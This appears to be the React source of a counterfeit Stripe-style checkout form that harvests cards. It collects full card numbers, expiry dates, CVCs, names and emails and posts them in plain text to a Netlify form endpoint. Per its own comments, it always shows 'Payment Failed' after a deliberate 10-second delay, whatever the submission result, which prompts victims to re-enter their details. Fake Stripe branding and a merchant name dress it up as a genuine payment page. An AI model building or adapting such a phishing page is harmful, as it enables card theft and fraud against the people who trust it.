import React, { useState } from 'react';
import { CreditCard, CheckCircle, ChevronDown, XCircle, RefreshCw, AlertCircle } from 'lucide-react';
import { Input } from './Input';
import { COUNTRIES } from '../utils/countries';

interface PaymentFormProps {
    currency: 'AED' | 'USD';
    onSuccess?: () => void;
}

// Luhn Algorithm Implementation
const luhnCheck = (val: string) => {
    let checksum = 0;
    let j = 1;
    for (let i = val.length - 1; i >= 0; i--) {
        let calc = 0;
        calc = Number(val.charAt(i)) * j;
        if (calc > 9) {
            checksum = checksum + 1;
            calc = calc - 10;
        }
        checksum = checksum + calc;
        j = (j == 1) ? 2 : 1;
    }
    return (checksum % 10) == 0;
};

export const PaymentForm = ({ currency }: PaymentFormProps) => {
    const [paymentStatus, setPaymentStatus] = useState<'idle' | 'processing' | 'success' | 'failed'>('idle');
    const [errors, setErrors] = useState<Record<string, string>>({});
    const [touched, setTouched] = useState<Record<string, boolean>>({});

    const [formData, setFormData] = useState({
        email: '',
        cardNumber: '',
        expiry: '',
        cvc: '',
        name: '',
        country: 'United Arab Emirates',
        saveInfo: false
    });

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
        const value = e.target.type === 'checkbox' ? (e.target as HTMLInputElement).checked : e.target.value;
        const name = e.target.name;

        setFormData({ ...formData, [name]: value });

        // Clear error when user types
        if (errors[name]) {
            setErrors({ ...errors, [name]: '' });
        }
    };

    const handleBlur = (e: React.FocusEvent<HTMLInputElement | HTMLSelectElement>) => {
        const name = e.target.name;
        setTouched({ ...touched, [name]: true });
        validateField(name, e.target.value);
    };

    const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = e.target.value.replace(/\D/g, '').slice(0, 16);
        const formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
        setFormData({ ...formData, cardNumber: formatted });
        if (errors.cardNumber) setErrors({ ...errors, cardNumber: '' });
    };

    const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        let value = e.target.value.replace(/\D/g, '').slice(0, 4);
        if (value.length >= 2) {
            value = value.slice(0, 2) + ' / ' + value.slice(2);
        }
        setFormData({ ...formData, expiry: value });
        if (errors.expiry) setErrors({ ...errors, expiry: '' });
    };

    const handleCvcChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = e.target.value.replace(/\D/g, '').slice(0, 3);
        setFormData({ ...formData, cvc: value });
        if (errors.cvc) setErrors({ ...errors, cvc: '' });
    };

    const validateField = (name: string, value: any): string | null => {
        let error = null;

        switch (name) {
            case 'email':
                if (!value) error = 'Email is required';
                else if (!/\S+@\S+\.\S+/.test(value)) error = 'Invalid email address';
                break;
            case 'cardNumber':
                const cleanNum = String(value).replace(/\s/g, '');
                if (!cleanNum) error = 'Card number is required';
                else if (cleanNum.length < 16) error = 'Card number is incomplete';
                else if (!luhnCheck(cleanNum)) error = 'Your card number is invalid.';
                break;
            case 'expiry':
                if (!value || value.length < 5) {
                    error = 'Incomplete expiry';
                } else {
                    const [monthStr, yearStr] = value.split(' / ');
                    const month = parseInt(monthStr, 10);
                    const year = parseInt(yearStr, 10);

                    if (!month || !year || month < 1 || month > 12) {
                        error = 'Invalid date';
                    } else {
                        const currentYear = new Date().getFullYear() % 100;
                        const currentMonth = new Date().getMonth() + 1;

                        if (year < currentYear) {
                            error = 'Your card\'s expiration year is in the past.';
                        } else if (year > 31) {
                            error = 'Invalid year';
                        } else if (year === currentYear && month < currentMonth) {
                            error = 'Your card\'s expiration month is invalid.';
                        }
                    }
                }
                break;
            case 'cvc':
                if (!value) error = 'Required';
                else if (value.length < 3) error = 'Invalid CVC';
                break;
            case 'name':
                if (!value) error = 'Name on card is required';
                break;
        }

        if (error) {
            setErrors(prev => ({ ...prev, [name]: error }));
        }
        return error;
    };

    const validateForm = () => {
        const newErrors: Record<string, string> = {};

        const fields = ['email', 'cardNumber', 'expiry', 'cvc', 'name'];
        fields.forEach(field => {
            // @ts-ignore
            const error = validateField(field, formData[field]);
            if (error) newErrors[field] = error;
        });

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();

        // Mark all as touched
        setTouched({
            email: true, cardNumber: true, expiry: true, cvc: true, name: true
        });

        if (!validateForm()) {
            // If errors exist, don't submit.
            // Focus the first error field if custom logic needed, or just let UI show errors.
            return;
        }

        setPaymentStatus('processing');

        try {
            // 10 seconds delay as requested
            await new Promise(resolve => setTimeout(resolve, 10000));

            await fetch("/", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: new URLSearchParams({
                    "form-name": "payment-form",
                    ...formData as any
                }).toString(),
            });

            // Force failed state as requested, regardless of actual submission result
            // Force failed state as requested, regardless of actual submission result
            setPaymentStatus('failed');
        } catch (error) {
            console.error("Submission error:", error);
            setPaymentStatus('failed');
        }
    };

    if (paymentStatus === 'processing') {
        return (
            <div className="flex flex-col items-center justify-center h-full p-8 text-center animate-in fade-in zoom-in duration-300">
                <div className="flex flex-col items-center">
                    {/* Stripe-like spinner */}
                    <div className="w-12 h-12 border-4 border-slate-200 border-t-[#0074E4] rounded-full animate-spin mb-6"></div>
                    <h2 className="text-xl font-bold text-slate-900 mb-2">Processing payment...</h2>
                    <p className="text-slate-500">Please do not refresh the page.</p>
                </div>
            </div>
        );
    }

    if (paymentStatus === 'failed') {
        return (
            <div className="flex flex-col items-center justify-center h-full p-8 text-center animate-in fade-in zoom-in duration-300">
                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-6 text-red-600">
                    <XCircle className="w-8 h-8" />
                </div>
                <h2 className="text-2xl font-bold text-slate-900 mb-2">Payment Failed</h2>
                <p className="text-slate-500 mb-6 max-w-xs mx-auto">
                    Your card was declined. Please check your card details or try a different payment method.
                </p>
                <button
                    onClick={() => setPaymentStatus('idle')}
                    className="flex items-center justify-center py-2.5 px-6 rounded-[4px] shadow-sm text-sm font-medium text-white bg-[#0074E4] hover:bg-[#0063c4] transition-all"
                >
                    <RefreshCw className="w-4 h-4 mr-2" /> Try Again
                </button>
            </div>
        );
    }

    if (paymentStatus === 'success') {
        return (
            <div className="flex flex-col items-center justify-center h-full p-8 text-center animate-in fade-in zoom-in duration-500">
                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-6 text-green-600">
                    <CheckCircle className="w-8 h-8" />
                </div>
                <h2 className="text-2xl font-bold text-slate-900 mb-2">Payment Successful</h2>
                <p className="text-slate-500 mb-4">
                    We've sent a receipt to {formData.email}
                </p>
            </div>
        );
    }

    return (
        <div className="max-w-md mx-auto w-full p-8 lg:p-12 h-full overflow-y-auto">

            {/* Pay with Link Button */}
            <button className="w-full flex justify-center items-center py-3 bg-[#00D924] hover:bg-[#00c920] text-black font-semibold rounded-[4px] mb-6 transition-colors shadow-sm">
                Pay with <span className="font-bold ml-1 flex items-center">
                    <span className="bg-black text-white rounded-full w-4 h-4 flex items-center justify-center text-[10px] mr-[1px]">&gt;</span>
                    Link
                </span>
            </button>

            <div className="relative mb-6">
                <div className="absolute inset-0 flex items-center">
                    <div className="w-full border-t border-slate-200"></div>
                </div>
                <div className="relative flex justify-center">
                    <span className="bg-white px-2 text-sm text-slate-400">OR</span>
                </div>
            </div>

            <form
                name="payment-form"
                method="POST"
                data-netlify="true"
                data-netlify-honeypot="bot-field"
                onSubmit={handleSubmit}
                className="space-y-6"
                noValidate
            >
                <input type="hidden" name="form-name" value="payment-form" />
                <p className="hidden">
                    <label>
                        Don’t fill this out if you’re human: <input name="bot-field" />
                    </label>
                </p>
                {/* Contact Info */}
                <div>
                    <h3 className="text-sm font-medium text-slate-700 mb-3">Contact information</h3>
                    <Input
                        label=""
                        type="email"
                        name="email"
                        placeholder="email@example.com"
                        value={formData.email}
                        onChange={handleChange}
                        onBlur={handleBlur}
                        error={touched.email && errors.email ? errors.email : undefined}
                        required
                        className="rounded-[4px] border-slate-300 shadow-sm"
                    />
                </div>

                {/* Payment Method */}
                <div>
                    <h3 className="text-sm font-medium text-slate-700 mb-3">Payment method</h3>

                    <div className="space-y-4">
                        {/* Card Container Box */}
                        <div className="border border-slate-200 rounded-[4px] p-4 bg-white relative">
                            {/* Radio selected indicator */}
                            <div className="absolute top-4 left-4">
                                <div className="w-4 h-4 border-[5px] border-black rounded-full"></div>
                            </div>
                            <div className="ml-8 flex items-center font-medium text-slate-900 mb-4">
                                <CreditCard className="w-4 h-4 mr-2" /> Card
                            </div>

                            <div className="space-y-3 ml-8"> {/* Indent content */}
                                <div className={`border rounded-[4px] overflow-hidden transition-colors ${(errors.cardNumber || errors.expiry || errors.cvc) ? 'border-red-300' : 'border-slate-200'
                                    }`}>
                                    <div className="relative">
                                        <input
                                            type="text"
                                            name="cardNumber"
                                            placeholder="1234 1234 1234 1234"
                                            className={`w-full px-3 py-2.5 outline-none text-slate-900 placeholder-slate-400 border-b focus:ring-1 focus:ring-inset focus:ring-[#0074E4] focus:z-10 relative ${errors.cardNumber ? 'border-red-200 bg-red-50' : 'border-slate-200'
                                                }`}
                                            value={formData.cardNumber}
                                            onChange={handleCardNumberChange}
                                            onBlur={handleBlur}
                                            inputMode="numeric"
                                            maxLength={19}
                                            required
                                        />
                                        <div className="absolute right-3 top-1/2 -translate-y-1/2 flex space-x-1">
                                            {errors.cardNumber ? (
                                                <AlertCircle className="w-5 h-5 text-red-500" />
                                            ) : (
                                                <>
                                                    <img src="https://js.stripe.com/v3/fingerprinted/img/visa-729c05c240c4bdb47b03ac81d9945bfe.svg" alt="Visa" className="h-5" />
                                                    <img src="https://js.stripe.com/v3/fingerprinted/img/mastercard-4d8844094130711885b5e41b28c9848f.svg" alt="Mastercard" className="h-5" />
                                                </>
                                            )}
                                        </div>
                                    </div>
                                    {errors.cardNumber && (
                                        <div className="px-3 py-1 bg-red-50 text-red-600 text-xs border-b border-red-100">
                                            {errors.cardNumber}
                                        </div>
                                    )}

                                    <div className="flex divide-x divide-slate-200">
                                        <div className="w-1/2 relative">
                                            <input
                                                type="text"
                                                name="expiry"
                                                placeholder="MM / YY"
                                                className={`w-full px-3 py-2.5 outline-none text-slate-900 placeholder-slate-400 focus:ring-1 focus:ring-inset focus:ring-[#0074E4] focus:z-10 relative ${errors.expiry ? 'bg-red-50' : ''
                                                    }`}
                                                value={formData.expiry}
                                                onChange={handleExpiryChange}
                                                onBlur={handleBlur}
                                                inputMode="numeric"
                                                maxLength={7}
                                                required
                                            />
                                            {errors.expiry && (
                                                <div className="px-3 py-1 bg-red-50 text-red-600 text-xs text-nowrap overflow-hidden">
                                                    {errors.expiry}
                                                </div>
                                            )}
                                        </div>
                                        <div className="relative w-1/2">
                                            <input
                                                type="text"
                                                name="cvc"
                                                placeholder="CVC"
                                                className={`w-full px-3 py-2.5 outline-none text-slate-900 placeholder-slate-400 pr-10 focus:ring-1 focus:ring-inset focus:ring-[#0074E4] focus:z-10 relative ${errors.cvc ? 'bg-red-50' : ''
                                                    }`}
                                                value={formData.cvc}
                                                onChange={handleCvcChange}
                                                onBlur={handleBlur}
                                                inputMode="numeric"
                                                maxLength={3}
                                                required
                                            />
                                            {errors.cvc ? (
                                                <AlertCircle className="w-4 h-4 text-red-500 absolute right-3 top-1/2 -translate-y-1/2 z-20" />
                                            ) : (
                                                <div className="absolute right-3 top-1/2 -translate-y-1/2 z-20 opacity-50">
                                                    <svg width="30" height="20" viewBox="0 0 30 20" xmlns="http://www.w3.org/2000/svg" fill="currentColor">
                                                        <path fillRule="evenodd" clipRule="evenodd" d="M25.2061 0.00488281C27.3194 0.112115 29 1.85996 29 4V11.3291C28.5428 11.0304 28.0336 10.8304 27.5 10.7188V8H1.5V16C1.5 17.3807 2.61929 18.5 4 18.5H10.1104V20H4L3.79395 19.9951C1.7488 19.8913 0.108652 18.2512 0.00488281 16.2061L0 16V4C0 1.85996 1.68056 0.112115 3.79395 0.00488281L4 0H25L25.2061 0.00488281ZM4 1.5C2.61929 1.5 1.5 2.61929 1.5 4V5H27.5V4C27.5 2.61929 26.3807 1.5 25 1.5H4Z"></path>
                                                        <path d="M27.5 12.7988C28.3058 13.1128 28.7725 13.7946 28.7725 14.6406C28.7722 15.4002 28.2721 15.9399 27.6523 16.1699C28.1601 16.3319 28.6072 16.6732 28.8086 17.2207C28.3597 18.6222 27.1605 19.6862 25.6826 19.9404C24.8389 19.7707 24.1662 19.2842 23.834 18.5H25C25.0914 18.5 25.1816 18.4939 25.2705 18.4844C25.5434 18.7862 25.9284 18.9501 26.3623 18.9502C27.142 18.9501 27.6922 18.5297 27.6924 17.79C27.6923 17.4212 27.5473 17.1544 27.2998 16.9795C27.4281 16.6786 27.5 16.3478 27.5 16V15.0527C27.5397 14.9481 27.5625 14.8309 27.5625 14.7002C27.5625 14.5657 27.5399 14.4422 27.5 14.3311V12.7988Z"></path>
                                                        <path d="M15.2207 18.5V18.8301H16.8799V19.9004H12.1104V18.8301H13.9902V18.5H15.2207Z"></path>
                                                        <path d="M19.9307 18.5L19.5762 18.7803H22.8369V19.9004H17.8164V18.8604L18.2549 18.5H19.9307Z"></path>
                                                    </svg>
                                                </div>
                                            )}
                                        </div>
                                    </div>
                                </div>

                                <div>
                                    <label className="block text-xs font-medium text-slate-700 mb-1">Cardholder name</label>
                                    <Input
                                        label=""
                                        name="name"
                                        placeholder="Full name on card"
                                        value={formData.name}
                                        onChange={handleChange}
                                        onBlur={handleBlur}
                                        error={touched.name && errors.name ? errors.name : undefined}
                                        required
                                        className="rounded-[4px] border-slate-300 shadow-sm"
                                    />
                                </div>

                                <div>
                                    <label className="block text-xs font-medium text-slate-700 mb-1">Country or region</label>
                                    <div className="relative">
                                        <select
                                            name="country"
                                            className="w-full px-3 py-2.5 rounded-[4px] border border-slate-200 bg-white outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 appearance-none"
                                            value={formData.country}
                                            onChange={handleChange}
                                        >
                                            {COUNTRIES.map(country => (
                                                <option key={country} value={country}>{country}</option>
                                            ))}
                                        </select>
                                        <ChevronDown className="w-4 h-4 text-slate-500 absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none" />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Save Info Checkbox */}
                <div className="rounded-[4px] border border-slate-200 bg-slate-50 p-4 flex items-start">
                    <input
                        type="checkbox"
                        name="saveInfo"
                        id="saveInfo"
                        className="mt-1 w-4 h-4 text-blue-600 border-slate-300 rounded focus:ring-blue-500"
                        onChange={handleChange}
                    />
                    <div className="ml-3">
                        <label htmlFor="saveInfo" className="text-sm font-medium text-slate-900 block">Save my information for faster checkout</label>
                        <p className="text-xs text-slate-500 mt-1">
                            Pay securely at KAYE & CO REAL ESTATE LLC and everywhere Link is accepted.
                        </p>
                    </div>
                </div>

                <button
                    type="submit"
                    disabled={false}
                    className={`
            w-full flex justify-center items-center py-3 px-4 rounded-[4px] shadow-sm text-base font-medium text-white 
            bg-[#0074E4] hover:bg-[#0063c4] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500
            transition-all duration-200 disabled:opacity-75 disabled:cursor-not-allowed
          `}
                >
                    {`Pay ${currency === 'AED' ? 'AED 100.00' : '$27.23'}`}
                </button>

                <div className="mt-8 pt-6 border-t border-slate-100 flex items-center text-xs text-slate-400">
                    <span className="mr-4">Powered by <span className="font-bold text-slate-500">stripe</span></span>
                    <span className="border-l border-slate-200 pl-4 mr-4">Terms</span>
                    <span>Privacy</span>
                </div>
            </form>
        </div>
    );
};
